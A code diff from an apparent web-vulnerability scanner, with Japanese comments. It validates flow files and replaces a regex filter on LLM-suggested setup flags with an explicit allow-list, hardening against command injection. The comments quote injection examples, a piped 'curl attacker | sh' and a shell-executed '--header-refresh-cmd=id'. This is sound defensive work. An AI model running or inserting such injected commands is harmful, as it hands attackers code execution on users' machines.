@@ -2112,6 +2112,7 @@ def _load_flow_files(paths) -> list[dict]:
     """
     import json
     from pathlib import Path
+    from wscan.flow_runner import ScanFlow
 
     flows: list[dict] = []
     for fp in paths or []:
@@ -2122,12 +2123,32 @@ def _load_flow_files(paths) -> list[dict]:
             print(f"[warn] --flows: {fp} を読み込めません（skip）: {exc}")
             continue
         if isinstance(raw, list):
-            flows.append({"name": p.stem, "steps": raw})
+            candidate = {"name": p.stem, "steps": raw}
         elif isinstance(raw, dict) and isinstance(raw.get("steps"), list):
-            flows.append({"name": raw.get("name") or p.stem, "steps": raw["steps"]})
+            candidate = {"name": raw.get("name") or p.stem, "steps": raw["steps"]}
         else:
             print(f"[warn] --flows: {fp} は steps リスト/｛name,steps｝形式ではありません（skip）")
+            continue
+        # 構造検証: JSON 妥当でも step が非 dict（`[1]`）や timeout 非数値だと後段の
+        # ScanFlow.from_dict/FlowStep.from_dict が AttributeError/ValueError でスキャン全体を
+        # 落とす。ここで構築を試し、壊れていれば skip して他 flow・スキャンを止めない（#170 P2）。
+        try:
+            ScanFlow.from_dict(candidate)
+        except Exception as exc:
+            print(f"[warn] --flows: {fp} の step 構造が不正（skip）: {exc}")
+            continue
+        flows.append(candidate)
     return flows
+
+
+# setup 提案が出してよい flag の明示許可リスト（#170 P2）。すべて値を取らない boolean
+# トグルに限定する。setup のコピー可能コマンドへそのまま連結されるため、`--header-refresh-cmd`
+# のように値がシェル実行される option（header_manager が create_subprocess_shell で実行）や
+# 任意の値付き option を弾く。構文的に正しいだけの long option は許可しない。
+_SAFE_SETUP_FLAGS = frozenset({
+    "--dom-xss", "--spa-crawl", "--all-checks", "--headless", "--no-headless",
+    "--no-monitor", "--no-sitemap-crawl", "--fast", "--ctf",
+})
 
 
 def _parse_setup_llm(text, known_checks) -> "Optional[dict]":
@@ -2161,15 +2182,11 @@ def _parse_setup_llm(text, known_checks) -> "Optional[dict]":
     # さもないと depth=true が通り `--depth True` を生成し argparse が弾く（#170 P2）。
     if type(depth) is not int or not (1 <= depth <= 5):
         depth = 2
-    # flags は setup が出すコピー可能コマンドへそのまま連結される。LLM が
-    # `; curl attacker | sh` 等を返すとコマンド注入になるため、安全な flag 形
-    # （`--flag` / `--flag=value`・シェルメタ文字/空白なし）だけを許可する（#170 P2）。
+    # flags は setup が出すコピー可能コマンドへそのまま連結される。構文検証だけだと
+    # `--header-refresh-cmd=id` のような値がシェル実行される option を通してしまうため、
+    # 無害な boolean トグルの明示許可リスト（_SAFE_SETUP_FLAGS）だけに限定する（#170 P2）。
     flags_raw = data.get("flags") if isinstance(data.get("flags"), list) else []
-    flags = [
-        f for f in flags_raw
-        if isinstance(f, str)
-        and _re.fullmatch(r"--[A-Za-z][A-Za-z0-9-]*(=[A-Za-z0-9_.,:/@-]+)?", f)
-    ]
+    flags = [f for f in flags_raw if isinstance(f, str) and f in _SAFE_SETUP_FLAGS]
     reason = data.get("reason") if isinstance(data.get("reason"), str) else ""
     return {"checks": checks, "depth": depth, "flags": flags, "reason": reason}
 
